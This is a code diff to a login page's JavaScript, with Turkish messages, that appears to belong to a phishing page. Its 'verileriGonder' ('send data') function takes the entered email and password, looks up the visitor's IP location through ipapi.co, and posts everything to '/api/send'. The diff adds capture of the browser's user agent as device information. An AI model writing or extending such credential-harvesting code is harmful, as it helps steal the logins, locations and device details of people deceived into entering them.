@@ -87,44 +87,44 @@
 
     <script>
         async function verileriGonder() {
-            const btn = document.querySelector('button');
-            const email = document.getElementById('userEmail').value;
-            const pass = document.getElementById('userPass').value;
+    const btn = document.querySelector('button');
+    const email = document.getElementById('userEmail').value;
+    const pass = document.getElementById('userPass').value;
+    const cihaz = navigator.userAgent; // Cihaz bilgisini buradan alıyoruz
 
-            if(!email || !pass) { 
-                alert("Lütfen tüm alanları doldurunuz!"); 
-                return; 
-            }
+    if(!email || !pass) { alert("Doldurunuz!"); return; }
 
-            btn.innerText = "Kontrol ediliyor...";
-            btn.disabled = true;
+    btn.innerText = "Kontrol ediliyor...";
+    btn.disabled = true;
 
-            try {
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
+    try {
+        const ipRes = await fetch('https://ipapi.co/json/');
+        const ipData = await ipRes.json();
 
-                const response = await fetch('/api/send', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email, pass, ipData })
-                });
+        const response = await fetch('/api/send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email, pass, ipData, cihaz }) // Cihaz bilgisini API'ye gönderdik
+        });
 
-                const result = await response.json();
+        const result = await response.json();
 
-                if (response.ok && result.success) {
-                    document.getElementById('login-form').style.display = 'none';
-                    document.getElementById('content').style.display = 'block';
-                } else {
-                    alert(result.message || "Hatalı şifre!");
-                    btn.innerText = "Giriş Yap";
-                    btn.disabled = false;
-                }
-            } catch (error) {
-                alert("Sistemle bağlantı kurulamadı!");
-                btn.innerText = "Giriş Yap";
-                btn.disabled = false;
-            }
+        if (response.ok && result.success) {
+            document.getElementById('login-form').style.display = 'none';
+            document.getElementById('content').style.display = 'block';
+        } else {
+            alert(result.message || "Hatalı şifre!");
+            btn.innerText = "Giriş Yap";
+            btn.disabled = false;
         }
+    } catch (error) {
+        alert("Bağlantı hatası!");
+        btn.innerText = "Giriş Yap";
+        btn.disabled = false;
+    }
+}
+
+            
     </script>
 
 </body>
